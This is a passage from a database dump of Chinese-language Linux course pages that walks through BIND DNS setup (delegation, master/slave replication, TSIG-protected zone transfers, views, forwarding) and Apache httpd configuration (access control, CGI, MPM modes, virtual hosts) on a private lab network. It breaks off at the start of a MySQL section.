www.uplooking.com.<br><br>[root@station40 ~]#&nbsp;host -t SOA uplooking.com<br>uplooking.com has SOA record dns.uplooking.com. root.uplooking.com. 2012092100 3600 900 604800 86400<br><br>[root@station40 ~]#&nbsp;host -t NS uplooking.com<br>uplooking.com name server dns.uplooking.com.<br><br>[root@station40 ~]#&nbsp;host -t MX uplooking.com<br>uplooking.com mail is handled by 10 mail.uplooking.com.<br><br><br>[root@station40 ~]#&nbsp;dig www.126.com<br><br>; &lt;&lt;&gt;&gt; DiG 9.3.6-P1-RedHat-9.3.6-20.P1.el5 &lt;&lt;&gt;&gt; www.126.com<br>;; global options: printcmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 33392<br>;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 1<br><br>;; QUESTION SECTION:<br>;www.126.com. IN A<br><br>;; ANSWER SECTION:<br>www.126.com. 7200 IN A 192.168.0.100<br><br>;; AUTHORITY SECTION:<br>126.com. 7200 IN NS dns.126.com.<br><br>;; ADDITIONAL SECTION:<br>dns.126.com. 7200 IN A 192.168.0.2<br><br>;; Query time: 0 msec<br>;; SERVER: 192.168.0.2#53(192.168.0.2)<br>;; WHEN: Fri Oct 5 00:09:28 2012<br>;; MSG SIZE rcvd: 79<br><br>[root@station40 ~]#&nbsp;dig @192.168.0.86 www.uplooking.com	//@192.168.0.86<br></dd></dl></dd><dt>子域授权</dt><dd>子域授权<br><br>授权子域可以由哪台DNS服务器来管理<br>父域: uplooking.com	www.uplooking.com<br>子域: it.uplooking.com	www.it.uplooking.com<br><br>==================================================================<br><br>一、父域授权<br><br>[root@station02 ~]#&nbsp;vim /var/named/chroot/etc/named.conf<br><br>zone \"uplooking.com\" {<br>type master;<br>file \"uplooking.com.zone\";<br>};<br><br>[root@station02 ~]#&nbsp;vim /var/named/chroot/var/named/uplooking.com.zone<br><br>$TTL 7200<br>@ IN SOA dns.uplooking.com. root (<br>2012092100<br>1H<br>15M<br>1W<br>1D )<br>IN NS dns<br>IN MX 10 mail<br>dns IN A 192.168.0.2<br>www IN A 192.168.0.15<br>oa IN A 192.168.0.20<br>ftp IN A 192.168.0.21<br>mail IN A 192.168.0.220<br><br>it.uplooking.com. IN NS dns.it.uplooking.com.<br>dns.it.uplooking.com. IN A 192.168.0.3<br><br>[root@station02 named]#&nbsp;rndc reload<br>server reload successful<br><br>==============================================================================<br><br>二、子域 it.uplooking.com<br><br>[root@station02 ~]#&nbsp;vim /var/named/chroot/etc/named.conf<br><br>zone \"it.uplooking.com\" {<br>type master;<br>file \"it.uplooking.com.zone\";<br>};<br><br>[root@station02 ~]#&nbsp;vim /var/named/chroot/var/named/it.uplooking.com.zone<br><br>$TTL 86400<br>@ IN SOA ns.it.uplooking.com. root (<br>2012092100&nbsp;<br>3H<br>15M<br>1W<br>1D )<br>IN NS ns<br>ns IN A 192.168.0.3<br>www IN A 1.1.1.1<br><br>===============================================================================<br><br>三、测试<br><br>1. 分别测试父域和子域<br>==================<br><br>[root@station40 ~]#&nbsp;dig @192.168.0.2 www.uplooking.com<br>[root@station40 ~]#&nbsp;dig @192.168.0.3 www.it.uplooking.com<br><br>2. 将本地DNS指向父域DNS服务器<br>==========================<br><br>[root@station40 ~]#&nbsp;cat /etc/resolv.conf&nbsp;<br>nameserver 192.168.0.2<br><br>[root@station40 ~]#&nbsp;host www.uplooking.com<br>www.uplooking.com has address 192.168.0.15<br><br>[root@station40 ~]#&nbsp;host www.it.uplooking.com<br>www.it.uplooking.com has address 1.1.1.1<br><br>[root@station40 ~]#&nbsp;dig @192.168.0.2 www.it.uplooking.com<br><br>; &lt;&lt;&gt;&gt; DiG 9.3.6-P1-RedHat-9.3.6-20.P1.el5 &lt;&lt;&gt;&gt; @192.168.0.2 www.it.uplooking.com<br>; (1 server found)<br>;; global options: printcmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 8265<br>;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 1<br><br>;; QUESTION SECTION:<br>;www.it.uplooking.com. IN A<br><br>;; ANSWER SECTION:<br>www.it.uplooking.com. 86349 IN A 1.1.1.1<br><br>;; AUTHORITY SECTION:<br>it.uplooking.com. 86349 IN NS ns.it.uplooking.com.<br><br>;; ADDITIONAL SECTION:<br>ns.it.uplooking.com. 86349 IN A 192.168.0.3<br><br>;; Query time: 1 msec<br>;; SERVER: 192.168.0.2#53(192.168.0.2)<br>;; WHEN: Fri Oct 5 00:32:20 2012<br>;; MSG SIZE rcvd: 87<br><br>[root@station02 named]#&nbsp;rndc flush	//清空父域DNS缓存<br><br>3. 将本地DNS指向子域<br>==================<br><br>[root@station40 ~]#&nbsp;cat /etc/resolv.conf&nbsp;<br>nameserver 192.168.0.3<br><br>[root@station40 ~]#&nbsp;host www.it.uplooking.com<br>www.it.uplooking.com has address 1.1.1.1<br><br>[root@station40 ~]#&nbsp;host www.uplooking.com	<br>Host www.uplooking.com not found: 2(SERVFAIL)<br><br><br><br><span style=\"font-weight: 700;\">Master/Slave</span><br></dd><dd>Master/Slave<br><br>================================================================================<br><br>一、Master<br><br>192.168.0.2 uplooking.com<br><br>[root@station11 named]#&nbsp;vim /var/named/chroot/etc/named.conf&nbsp;<br><br>zone \"uplooking.com\" {<br>type master;<br>file \"uplooking.com.zone\";<br>};<br><br>[root@station02 ~]#&nbsp;vim /var/named/chroot/var/named/uplooking.com.zone<br><br>$TTL 7200<br>@ IN SOA dns1.uplooking.com. root (<br>2012092100<br>1H<br>15M<br>1W<br>1D )<br>IN NS dns1<br>IN NS dns2<br>IN MX 10 mail<br>dns1 IN A 192.168.0.2<br>dns2 IN A 192.168.0.3<br>www IN A 192.168.0.15<br>oa IN A 192.168.0.20<br>ftp IN A 192.168.0.21<br>mail IN A 192.168.0.220<br><br>[root@station02 ~]#&nbsp;service named restart<br>停止 named： [确定]<br>启动 named： [确定]<br><br>===================================================================================<br><br>二、Slave<br><br>192.168.0.3 uplooking.com<br><br>[root@station11 ~]#&nbsp;ll -d /var/named/chroot/var/named/<br>drwxr-x--- 4 root named 4096 10-05 09:11 /var/named/chroot/var/named/<br><br>[root@station11 ~]#&nbsp;ll -d /var/named/chroot/var/named/slaves //数据库文件位置<br>drwxrwx--- 2 named named 4096 2004-07-27 /var/named/chroot/var/named/slaves/<br><br>[root@station11 ~]#&nbsp;vim /var/named/chroot/etc/named.conf<br><br>zone \"uplooking.com\" {<br>type slave;<br>file \"slaves/uplooking.com.zone\";<br>masters { 192.168.0.2; };<br>};<br><br>[root@station11 ~]#&nbsp;service named restart<br>停止 named： [确定]<br>启动 named： [确定]<br><br>[root@station11 ~]#&nbsp;ls /var/named/chroot/var/named/slaves/<br>uplooking.com.zone<br><br>==================================================================================<br><br>三、使用slave测试<br><br>[root@station40 ~]#&nbsp;dig @192.168.0.3 www.uplooking.com<br><br>; &lt;&lt;&gt;&gt; DiG 9.3.6-P1-RedHat-9.3.6-20.P1.el5 &lt;&lt;&gt;&gt; @192.168.0.3 www.uplooking.com<br>; (1 server found)<br>;; global options: printcmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 42170<br>;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 2<br><br>===================================================================================<br><br>主/辅同步注意事项：<br><br>SOA记录<br>uplooking.com IN SOA dns1.uplooking.com. root.uplooking.com. (<br>2012092100 ; serial<br>3600 ; refresh (1 hour)<br>900 ; retry (15 minutes)<br>604800 ; expire (1 week)<br>86400 ; minimum (1 day)<br>)<br><br>修改：主DNS，每次修改数据库文件，手动增加其序列号<br><br>====================================================================================<br><br><dl><dt>主从DNS数据transfer控制</dt><dd>主从之间的区域传输的限制：zone transfer 只能在主上做限制<br><br>=======================================================================================<br><br>方法一：基于主机的访问控制<br><br>[root@station02 named]# vim /var/named/chroot/etc/named.conf<br><br>options {<br>directory \"/var/named\";<br>dump-file \"/var/named/data/cache_dump.db\";<br>statistics-file \"/var/named/data/named_stats.txt\";<br>memstatistics-file \"/var/named/data/named_mem_stats.txt\";<br>allow-transfer { 192.168.0.1; }; //全局限制<br>};<br><br>=========================================================================================<br><br>方法二：TSIG事务签名<br><br>1. 生成key(主辅随意)，并复制到辅助DNS<br>================================<br><br>[root@station02 ~]# cat /var/named/chroot/etc/rndc.key //参考的模板文件<br><br>key \"rndckey\" {<br>algorithm hmac-md5;<br>secret \"7VO37tMhsXod7BhMxi4EhAjaKvt3BoX3Jpbyv7kIDlBZ0y95aTDzXBiN8LJK\";<br>};<br><br>[root@station02 ~]#&nbsp;dnssec-keygen --help<br>[root@station02 ~]#&nbsp;dnssec-keygen -a HMAC-MD5 -b 128 -n HOST tsig-key<br>Ktsig-key.+157+54180<br><br>[root@station02 ~]#&nbsp;ls<br>anaconda-ks.cfg install.log Ktsig-key.+157+54180.key rhel5.repo<br>Desktop install.log.syslog Ktsig-key.+157+54180.private<br><br>[root@station02 ~]#&nbsp;cp Ktsig-key.+157+54180.private /var/named/chroot/etc/transfer.key<br>[root@station02 ~]#&nbsp;cat /var/named/chroot/etc/transfer.key&nbsp;<br><br>key \"tsig-key.\" {<br>Algorithm HMAC-MD5;<br>secret \"4X3qDcVgx2W3ClRx7+J6Vg==\";<br>};<br><br>[root@station02 ~]#&nbsp;chmod 644 /var/named/chroot/etc/transfer.key<br>[root@station02 ~]#&nbsp;rsync -a /var/named/chroot/etc/transfer.key 192.168.0.3:/var/named/chroot/etc/<br><br>2. 主DNS<br>=========<br><br>[root@station02 ~]# vim /var/named/chroot/etc/named.conf<br>options {<br>directory \"/var/named\";<br>dump-file \"/var/named/data/cache_dump.db\";<br>statistics-file \"/var/named/data/named_stats.txt\";<br>memstatistics-file \"/var/named/data/named_mem_stats.txt\";<br>allow-transfer { key tsig-key.;};	//只有持该key的主机可以传输<br>};<br>include \"/etc/transfer.key\";<br><br><br>3. 辅助DNS<br>==========<br><br>[root@station11 slaves]#&nbsp;chmod 644 /var/named/chroot/etc/transfer.key //辅助<br>[root@station11 slaves]#&nbsp;vim /var/named/chroot/etc/named.conf<br><br>options {<br>directory \"/var/named\";<br>dump-file \"/var/named/data/cache_dump.db\";<br>statistics-file \"/var/named/data/named_stats.txt\";<br>memstatistics-file \"/var/named/data/named_mem_stats.txt\";<br>allow-transfer { none; };<br>};<br><br>include \"/etc/transfer.key\";	//把key文件包含到主配置文件中<br><br>server 192.168.0.2 {	//当去连接192.168.0.2时，使用tsig-key.<br>keys { tsig-key.; };	//key名字<br>};<br>zone \"uplooking.com\" {<br>type slave;<br>file \"slaves/uplooking.com.zone\";<br>masters { 192.168.0.2; };<br>};<br></dd></dl></dd><dt>view视图</dt><dd>view视图<br><br>[root@station11 ~]#&nbsp;vim /var/named/chroot/etc/named.conf<br><br>view \"internal\" {<br>match-clients { 192.168.0.40; };<br>zone \"tianyun.com\" {<br>type master;<br>file \"tianyun.com.zone-internal\";<br>};<br>};<br><br>view \"cracker\" {<br>match-clients { 192.168.0.2; };<br>zone \"tianyun.com\" {<br>type master;<br>file \"tianyun.com.zone-cracker\";<br>};<br>};<br><br>[root@station11 named]#&nbsp;pwd<br>/var/named/chroot/var/named<br>[root@station11 named]#&nbsp;cat tianyun.com.zone-internal&nbsp;<br><br>$TTL 7200<br>@ IN SOA dns.tianyun.com. root (<br>2012092100<br>1H<br>15M<br>1W<br>1D )<br>IN NS dns<br>dns IN A 192.168.0.3<br>www IN A 1.1.1.1<br>oa IN A 192.168.0.15<br><br>[root@station11 named]#&nbsp;cat tianyun.com.zone-cracker&nbsp;<br><br>$TTL 7200<br>@ IN SOA dns.tianyun.com. root (<br>2012092100<br>1H<br>15M<br>1W<br>1D )<br>IN NS dns<br>dns IN A 192.168.0.3<br>www IN A 2.2.2.2<br><br>======================================================================<br><br>acl语法<br>acl string { address_match_element; ... };<br><br>[root@station11 ~]#&nbsp;vim /var/named/chroot/etc/named.conf<br><br>acl \"internal\" { 192.168.0.40; };<br>acl \"cracker\" { 192.168.0.3; };<br><br>view \"internal\" {<br>match-clients { \"internal\"; };<br>zone \"tianyun.com\" {<br>type master;<br>file \"tianyun.com.zone-internal\";<br>};<br>};<br><br>view \"cracker\" {<br>match-clients { \"cracker\"; };<br>zone \"tianyun.com\" {<br>type master;<br>file \"tianyun.com.zone-cracker\";<br>};<br>};<br><br>=======================================================================<br><br>郑重提醒：一旦使用view，所有区域都必须包含在视图中！否则。。。<br><br>[root@station11 named]#&nbsp;service named restart<br>停止 named： [确定]<br>启动 named：<br>named配置错误：:<br>/etc/named.conf:45: when using \'view\' statements, all zones must be in views<br><br>[失败]<br></dd><dt>惟缓存DNS Serve</dt><p></p><dd><span>惟缓存DNS Server<br></span><br><span>转发&amp;缓存</span><br><br>=====================================================================<br><br><span>无论哪个网断的请求都只转发到指定的DNS Server<br></span><br>[root@station11 ~]#<span>&nbsp;</span><span>vim /var/named/chroot/etc/named.conf</span><br><br><span>options {<br>directory \"/var/named\";<br>dump-file \"/var/named/data/cache_dump.db\";<br>statistics-file \"/var/named/data/named_stats.txt\";<br>memstatistics-file \"/var/named/data/named_mem_stats.txt\";<br>forward first;<br>forwarders { 202.106.0.20;<br>8.8.8.8; };<span>&nbsp;</span><br>};<br><br>zone \".\" {<br>type hint;<br>file \"named.ca\";<br>};<br><br></span>=======================================================================<br><br><span>来自对一域的解析请求发送到特定的DNS Server，其他请求发送到默认DNS Server<br><br></span><span>适合公司内网的DNS Server，当公司内部全部请求都发送给公司内网DNS时，会造成DNS压力过大，<br>可以利用此方法实现来自公司内部域名的解析请求发送到公司内部DNS Server，其他解析请求直接<br>抓发到其他DNS Server，以减轻公司内部DNS Server压力，同时对公司内部域名达到很好的解析<br>效果</span><span><br><br>options {<br>directory \"/var/named\";<br>dump-file \"/var/named/data/cache_dump.db\";<br>statistics-file \"/var/named/data/named_stats.txt\";<br>memstatistics-file \"/var/named/data/named_mem_stats.txt\";<br>forward first;<br>forwarders { 202.106.0.20;<br>8.8.8.8; };<span>&nbsp;</span><br>};<br><br>zone \"uplooking.com\" {<br>type forward;<br>forwarders { 192.168.0.100; }; //来自uplookin.com域的解析请求全部转发到192.168.0.100服务器<br>};<br><br>zone \".\" {<br>type hint;<br>file \"named.ca\";<br>};</span></dd><p><br></p>',3,'http://oda8mr8yr.bkt.clouddn.com/centos.jpg','centos:latest','2016-10-13 11:23:01',1,NULL,'',0,''),(76,'linux基础课程训练十五','apache方面的命令操作','<p>说明：我虚拟环境使用的是centos,可以通过&nbsp;cat&nbsp;/etc/issue来查看，如果发现测试的命令找不到\r\n</p><p>可以使用yum&nbsp;install&nbsp;-y&nbsp;命令&nbsp;先插入这个命令再去运行试一试。比如man命令可能运行不了。yum&nbsp;install&nbsp;-y&nbsp;man&nbsp;之后就可以正常使用了。</p><p>我们建议学员在自己的机器装虚拟机然后在虚拟机中装相应的linux系统做操作练习。</p><p>Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛<br>Apache Server配置界面使用的计算机平台上。&nbsp;<br><br>Apache源于NCSAhttpd（ NationalCenterforSupercomputingApplications，<br>简称为NCSA，超级计算机应用程序国家中心）服务器，经过多次修改，成为世界上最流行的Web<br>服务器软件之一。Apache取自“a patchy server”的读音，意思是充满补丁的服务器，因为<br>它是自由软件，所以不断有人来为它开发新的功能、新的特性、修改原来的缺陷。Apache的特点<br>是简单、速度快、性能稳定，并可做代理服务器来使用。<br>　　<br>本来它只用于小型或试验Internet网络，后来逐步扩充到各种Unix系统中，尤其对Linux<br>的支持相当完美。Apache有多种产品，可以支持SSL技术，支持多个虚拟主机。<br><br>Apache是以进程为基础的结构，进程要比线程消耗更多的系统开支，不太适合于多处理器环<br>境，因此，在一个Apache Web站点扩容时，通常是增加服务器或扩充群集节点而不是增加处理<br>器。到目前为止Apache仍然是世界上用的最多的Web服务器，市场占有率达60%左右。它的成功<br>之处主要在于它的源代码开放、有一支开放的开发队伍、支持跨平台的应用（可以运行在几乎所<br>有的Unix、Windows、Linux系统平台上）以及它的可移植性等方面。&nbsp;<br><br>========================================================================<br><br>Apache web服务器软件拥有以下特性：　　<br>支持最新的HTTP/1.1通信协议 　　<br>拥有简单而强有力的基于文件的配置过程 　　<br>支持通用网关接口 　　<br>支持基于IP和基于域名的虚拟主机 　　<br>支持多种方式的HTTP认证 　　<br>集成Perl处理模块 　　<br>集成代理服务器模块 　　<br>支持实时监视服务器状态和定制服务器日志 　　<br>支持服务器端包含指令(SSI) 　　<br>支持安全Socket层(SSL) 　　<br>提供用户会话过程的跟踪 　　<br>支持FastCGI 　　<br>通过第三方模块可以支持Java Servlets&nbsp;<br></p><dl><dt>安装配置</dt><dd><br><span>安装配置</span><br><br>软件包：httpd<br>服务端口：80/tcp(http) 443/tcp(https, http + ssl)<br>配置文件：/etc/httpd/conf/httpd.conf<br>/etc/httpd/conf.d/*.conf<br>/etc/httpd/conf.d/welcome.conf	//默认测试页面，建议删除<br><br>[root@station02 ~]#<span>&nbsp;</span><span>yum -y install httpd</span><br>[root@station02 ~]#<span>&nbsp;</span><span>tree /etc/httpd/</span><br>/etc/httpd/<br>|-- conf<br>| |-- httpd.conf<br>| `-- magic<br>|-- conf.d<br>| |-- README<br>| |-- proxy_ajp.conf<br>| `-- welcome.conf<br>|-- logs -&gt; ../../var/log/httpd<br>|-- modules -&gt; ../../usr/lib/httpd/modules<br>`-- run -&gt; ../../var/run<br><br>[root@station02 ~]#<span>&nbsp;</span><span>vim /etc/httpd/conf/httpd.conf</span><br><br><span>### Section 1: Global Environment<br>ServerRoot \"/etc/httpd\"	//Apache安装目录<br>PidFile run/httpd.pid	//pid文件<br>Listen 80	//监听的端口<br># Dynamic Shared Object (DSO) Support // /etc/httpd/modules/<br>LoadModule auth_basic_module modules/mod_auth_basic.so<br>Include conf.d/*.conf	//包含/etc/httpd/conf.d/*.conf<br>User apache	//运行Apache的用户<br>Group apache	//运行Apache的组<br><br>### Section 2: \'Main\' server configuration<br>ServerAdmin root@localhost<br>#ServerName www.example.com:80<br>DocumentRoot \"/var/www/html\"	//站点主目录<br>DirectoryIndex index.html index.php //设置网站首页<br><br>### Section 3: Virtual Hosts</span><br><br>=====================================================================<br></dd><dt>Apache配置示例</dt><dd><span>Apache配置示例</span><br><br>[root@station02 html]#<span>&nbsp;</span><span>pwd</span><br>/var/www/html<br><br>[root@station02 html]#<span>&nbsp;</span><span>cat index.html<span>&nbsp;</span></span><br>welcome to tianyun.com.<br><br>[root@station02 html]#<span>&nbsp;</span><span>service httpd start</span><br>启动 httpd： [确定]<br><br>[root@station02 html]#<span>&nbsp;</span><span>chkconfig httpd on</span><br>[root@station02 html]#<span>&nbsp;</span><span>ps auxf | grep httpd |grep -v \'grep\'<br></span><br>root 32731 0.0 1.1 10092 2912 ? Ss 13:12 0:00 /usr/sbin/httpd<br>apache 32732 0.0 0.8 10092 2056 ? S 13:12 0:00 \\_ /usr/sbin/httpd<br>apache 32733 0.0 0.8 10092 2056 ? S 13:12 0:00 \\_ /usr/sbin/httpd<br>apache 32734 0.0 0.8 10092 2056 ? S 13:12 0:00 \\_ /usr/sbin/httpd<br>apache 32735 0.0 0.8 10092 2056 ? S 13:12 0:00 \\_ /usr/sbin/httpd<br>apache 32736 0.0 0.8 10092 2056 ? S 13:12 0:00 \\_ /usr/sbin/httpd<br>apache 32737 0.0 0.8 10092 2056 ? S 13:12 0:00 \\_ /usr/sbin/httpd<br>apache 32738 0.0 0.8 10092 2056 ? S 13:12 0:00 \\_ /usr/sbin/httpd<br>apache 32739 0.0 0.8 10092 2056 ? S 13:12 0:00 \\_ /usr/sbin/httpd<br><br>[root@station02 html]#<span>&nbsp;</span><span>netstat -tnlp |grep :80</span><br>tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 32731/httpd<span>&nbsp;</span><br><br>[root@station02 html]#<span>&nbsp;</span><span>netstat -an |grep :80</span><br>tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN<span>&nbsp;</span><br>tcp 0 0 192.168.0.2:80 192.168.0.40:55410 TIME_WAIT<span>&nbsp;</span><br>tcp 0 0 192.168.0.2:80 192.168.0.40:55411 TIME_WAIT<span>&nbsp;</span><br>tcp 0 0 192.168.0.2:80 192.168.0.40:55412 TIME_WAIT<span>&nbsp;</span><br>tcp 0 0 192.168.0.2:80 192.168.0.195:1038 TIME_WAIT<span>&nbsp;</span><br><br>[root@station40 ~]#<span><span>&nbsp;</span>elinks -dump 192.168.0.2</span><br>welcome to tianyun.com.<br><br>==========================================================================================<br><br><span>基于用户家目录发布网页<br></span><br><span>&lt;IfModule mod_userdir.c&gt;<br>UserDir public_html<br>&lt;/IfModule&gt;</span><br><br><span>service httpd restart</span><br><br><span>useradd robin<br>useradd zorro</span><br><br><span>mkdir /home/robin/public_html<br>mkdir /home/zorro/public_html</span><br><br><span>chmod 755 /home/zorro /home/robin<br><br>echo \"This is robin\'s home\" &gt;&gt; /home/robin/public_html/index.html<br>echo \"This is zorro\'s home\" &gt;&gt; /home/zorro/public_html/index.html</span><br><br>测试<br>http://192.168.0.1/~robin<br>http://192.168.0.1/~zorro<br><br>===========================================================================================<br><br><span>别名方式发布<br></span><br><span>alias /down /var/ftp<br>&lt;directory /var/ftp&gt;<br>options indexes<br>&lt;/directory&gt;<br><br>http://192.168.0.1/down</span><br><br>============================================================================================<br><br><span>基于主机的访问控制<br></span><br><span>alias /down /var/ftp<br>&lt;directory /var/ftp&gt;<br>options indexes<br>order allow,denyhttpd-manual-2.2.3-63.el5.i386.rpm<br>allow from all<br>deny from 192.168.0.1<br>&lt;/directory&gt;</span><br><br>============================================================================================<br><br><span>基于用户验证的访问控制<br></span><br><span>rpm -ivh httpd-manual-2.2.3-63.el5.i386.rpm</span><br><span>cd /var/www/manual<br>firefox index.html</span><br><br><span>alias /down /var/ftp<br>&lt;directory /var/ftp&gt;<br>options indexes<br>AuthType Basic<br>AuthName \"Please input your account and passwd!\"<br>AuthBasicProvider file<br>AuthUserFile /etc/httpd/conf/passwdb<br>Require user alex<br>#Require valid-user 所有在/etc/httpd/conf/passwdb都可以访问<br>&lt;/directory&gt;</span><br><br><span>htpasswd -c -b /etc/httpd/conf/passwdb alex 123<br>htpasswd -b /etc/httpd/conf/passwdb jack 123<br><br></span>=============================================================================================<span><br></span><br><span>发布cgi脚本<br></span><br><span>ScriptAlias /cgi-bin/ \"/var/www/cgi-bin/\"<br>&lt;Directory \"/var/www/cgi-bin\"&gt;<br>AllowOverride None<br>Options None<br>Order allow,deny<br>Allow from all<br>&lt;/Directory&gt;</span><br><br><span>cd /var/www/cgi-bin/<br>touch cgi.sh<br>chmod +x cgi.sh<br>vim cgi.sh</span><br><br><span>#!/bin/bash<br>echo -e \"content-type: text/html\\n\"<br>uname -a<br>echo \"&lt;br&gt;\"<br>date +%F</span><br><br><span>http://192.168.0.1/cgi-bin/cgi.sh</span><br><br></dd><dt>Apache工作模式</dt><dd><span>Apache工作模式<br><br></span><span>进程模式：prefork<br>线程模式：worker</span><br><br>========================================================================================<br><br><span>Apache支持的默认模式 进程模式<br></span><br>[root@station02 html]#<span>&nbsp;</span><span>which httpd	</span>#进程模式<br>/usr/sbin/httpd<br><br>[root@station02 html]#<span>&nbsp;</span><span>which httpd.worker<span>&nbsp;</span></span>#线程模式<br>/usr/sbin/httpd.worker<br><br>[root@station02 html]#<span>&nbsp;</span><span>httpd -l<br></span><br><span>Compiled in modules:<br>core.c<br>prefork.c	//当前Apache工作在进程模式<br>http_core.c<br>mod_so.c</span><br><br>=======================================================================================<br><br><span>切换到线程(worker)模式<br></span><br>[root@station02 ~]#<span>&nbsp;</span><span>cd /usr/sbin/</span><br>[root@station02 sbin]#<span>&nbsp;</span><span>cp httpd httpd.prefork</span>	//备份<br>[root@station02 sbin]#<span>&nbsp;</span><span>ll httpd*<br></span><br>-rwxr-xr-x 1 root root 317108 2012-01-05 httpd	//当前使用的<br>-rwxr-xr-x 1 root root 331804 2012-01-05 httpd.event<br>-rwxr-xr-x 1 root root 317108 10-05 13:36 httpd.prefork<br>-rwxr-xr-x 1 root root 328604 2012-01-05 httpd.worker<br><br>[root@station02 sbin]#<span>&nbsp;</span><span>service httpd stop</span><br>[root@station02 sbin]#<span>&nbsp;</span><span>cp httpd.worker httpd</span><br>cp：是否覆盖“httpd”? y<br>[root@station02 sbin]#<span>&nbsp;</span><span>service httpd restart</span><br>停止 httpd： [确定]<br>启动 httpd： [确定]<br><br>[root@station02 sbin]#<span>&nbsp;</span><span>httpd -l<br></span><br><span>Compiled in modules:<br>core.c<br>worker.c	//当前Apache工作在线程模式<br>http_core.c<br>mod_so.c</span><br><br>=========================================================================================<br><br><span>进程模式和线程模式配置</span><br><span><br>进程模式<br>=======</span><br><br><span># prefork MPM	<br>&lt;IfModule prefork.c&gt;<br>StartServers 10	//初始建立的进程数（1个母进程＋8个子进程）	<br>MinSpareServers 10	//最小空闲的进程数<br>MaxSpareServers 15	//最大空闲的进程数<br>ServerLimit 2000	//服务器最大连接限制<br>MaxClients 1500	//服务器接受的并发访问量<br>MaxRequestsPerChild 4000	//每个子进程在其生命周期内允许服务的最大请求数据，达到后会结束，0表示永不<br>&lt;/IfModule&gt;</span><br><br><span>线程模式<br>=======<br></span><br><span># worker MPM<span>&nbsp;</span><br>&lt;IfModule worker.c&gt;	<br>StartServers 2	//初始建立的进程数<br>MaxClients 2000	//允许服务器接受的并发访问量（最大线程数）<br>MinSpareThreads 25	//最小空闲的线程数	<br>MaxSpareThreads 75	//最大空闲的线程数<br>ThreadsPerChild 50	//每个子进程建立的线程数<br>MaxRequestsPerChild 0	//每个子进程在其生命周期内允许服务的最大请求数据，达到后会结束，0表示永不<br>&lt;/IfModule&gt;</span><br><br><br></dd><dt>虚拟主机</dt><dd><span>虚拟主机技术</span><br><br><span>1. 基于IP	//对于最终用户来说，是透明的 SSL https<br>2. 基于主机名（主机头）	//对于最终用户来说，是透明的<br>3. 基于端口</span><br><br><span>### Section 3: Virtual Hosts	//虚拟主机<br><br></span>==============================================================================<br><span><br></span><dl><dt>基于主机名</dt><dd><br>==================================================================================<br><br><span>基于主机名</span><br><br><span>name-based,一个IP对应该多个主机名<br><br></span>===================================================================================<span><br><br></span><br><br><span>一、DNS解析<br></span><br>www.tianyun.com,tianyun.com ===&gt; 192.168.0.2<br>www.uplooking.com,uplooking.com ===&gt; 192.168.0.2<br><br>===================================================================================<br><br><span>二、虚拟主机<br></span><br><span>1. 准备工作</span><br>[root@station02 ~]#<span>&nbsp;</span><span>mkdir /var/www/{tianyun,uplooking}</span><br>[root@station02 ~]#<span>&nbsp;</span><span>echo \"www.tianyun.com\" &gt; /var/www/tianyun/index.html</span><br>[root@station02 ~]#<span>&nbsp;</span><span>echo \"www.uplooking.com\" &gt; /var/www/uplooking/index.html</span><br><br><span>2. 配置apache实现虚拟主机</span><br><span>注：基于虚拟主机的web服务，客户端是不能通过IP访问！<br></span><br>[root@station02 ~]#<span>&nbsp;</span><span>vim /etc/httpd/conf/httpd.conf<br></span><br><span>NameVirtualHost *:80	//支持基于名字的虚拟主机<br>&lt;VirtualHost *:80&gt;<br>DocumentRoot /var/www/tianyun<br>ServerName www.tianyun.com<br>ServerAlias tianyun.com<br>&lt;/VirtualHost&gt;<br><br>&lt;VirtualHost *:80&gt;<br>DocumentRoot /var/www/uplooking<br>ServerName www.uplooking.com<br>ServerAlias uplooking.com<br>&lt;/VirtualHost&gt;</span><br><br>======================================================================================<br><br><span>三、测试<br></span><br><span>仅支持使用名字访问<br></span><br>[root@station40 ~]#<span>&nbsp;</span><span>links --dump http://www.tianyun.com</span><br>www.tianyun.com<br>[root@station40 ~]#<span>&nbsp;</span><span>links --dump http://tianyun.com</span><br>www.tianyun.com<br><br><br><span style=\"font-weight: 700;\">基于IP虚拟主机</span><br></dd><dd><br>==================================================================================<br><br><span>基于IP虚拟主机</span><br><br><span>客户端可以IP访问<br><br></span>==================================================================================<span><br><br></span>规划：<span><br><br>网站	IP	主目录	log<br></span>www.tianyun.com	192.168.0.2 /var/www/tianyun<br>www.uplooking.com 192.168.0.2 /var/www/uplooking<br><span><br></span>===================================================================================<br><br><span>一、DNS解析<br></span><br>www.tianyun.com,tianyun.com ===&gt; 192.168.0.2<br>www.uplooking.com,uplooking.com ===&gt; 192.168.0.3<br><br>====================================================================================<br><br><span>二、虚拟主机</span><br><br>[root@station02 ~]#<span>&nbsp;</span><span>vim /etc/httpd/conf/httpd.conf</span><br><br><span>&lt;VirtualHost 192.168.0.2:80&gt;<br>DocumentRoot /var/www/tianyun<br>ServerName www.tianyun.com<br>ServerAlias tianyun.com<br>&lt;/VirtualHost&gt;<br><br>&lt;VirtualHost 192.168.0.3:80&gt;<br>DocumentRoot /var/www/uplooking<br>ServerName www.uplooking.com<br>ServerAlias uplooking.com<br>&lt;/VirtualHost&gt;<br><br></span>======================================================================================<span><br><br></span><span>三、测试</span><span><br></span><span><br>[root@station40 ~]#<span>&nbsp;</span></span><span>links --dump http://www.uplooking.com</span><span><br>www.uplooking.com<br>[root@station40 ~]#<span>&nbsp;</span></span><span>links --dump http://uplooking.com</span><span><br>www.uplooking.com<br><br></span><br><br></dd></dl></dd><dt>LAMP</dt><dd><span>LAMP<br></span><br><span>1. 搭建环境LAMP，测试<br>2. 上传网站<br>3. 手工创建数据库，并导入网站数据库结构（*.sql）<br>4. 配置网站连接数据库（数据库服务器IP、数据库名、用户名、密码）<br></span><br><br><dl><dt>Mysql的源码包安装</dt><dd><span>Mysql的源码包安装</span><br><br><span>tar xf 